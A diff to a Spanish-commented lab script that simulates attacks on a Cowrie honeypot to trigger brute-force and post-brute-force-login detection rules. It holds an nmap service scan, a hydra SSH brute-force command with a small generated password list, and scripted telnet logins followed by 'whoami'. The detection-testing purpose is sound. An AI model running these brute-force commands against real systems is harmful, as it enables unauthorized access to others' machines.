@@ -14,12 +14,17 @@ attack_nmap() {
   nmap -sV -T4 -p "${SSH_PORT},${TELNET_PORT}" "$COWRIE_HOST" 2>/dev/null || true
 }
 
+# Diccionario propio: primero contraseñas que el honeypot DENIEGA (userdb.txt) para
+# generar >= 5 fallos seguidos (regla 100111, T1110) y al final una que ACEPTA
+# (userdb: *:x:*), lo que dispara "login tras fuerza bruta" (regla 100113, T1078).
+# Antes apuntaba a un diccionario inexistente y solo hacía 1 intento.
+WORDLIST=/tmp/valhalla-wordlist.txt
+LAB_PASSWORD="${LAB_PASSWORD:-Valhalla-lab-2026}"
+printf '%s\n' root admin password 123456 toor "$LAB_PASSWORD" > "$WORDLIST"
+
 attack_ssh_bruteforce() {
-  log "VECTOR 2 — Brute force SSH (hydra)"
-  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt \
-    -t 4 -f -s "$SSH_PORT" "$COWRIE_HOST" ssh 2>/dev/null \
-    || hydra -l admin -p admin -t 2 -f -s "$SSH_PORT" "$COWRIE_HOST" ssh 2>/dev/null \
-    || true
+  log "VECTOR 2 — Fuerza bruta SSH (hydra, $(wc -l < "$WORDLIST") contraseñas)"
+  hydra -l root -P "$WORDLIST" -t 1 -W 1 -f -s "$SSH_PORT" "$COWRIE_HOST" ssh 2>/dev/null || true
 }
 
 attack_telnet_interactive() {
@@ -28,7 +33,7 @@ attack_telnet_interactive() {
     sleep 1
     echo "root"
     sleep 1
-    echo "123456"
+    echo "$LAB_PASSWORD"   # credencial aceptada por el honeypot: así se ejecutan los comandos
     sleep 1
     echo "whoami"
     sleep 1
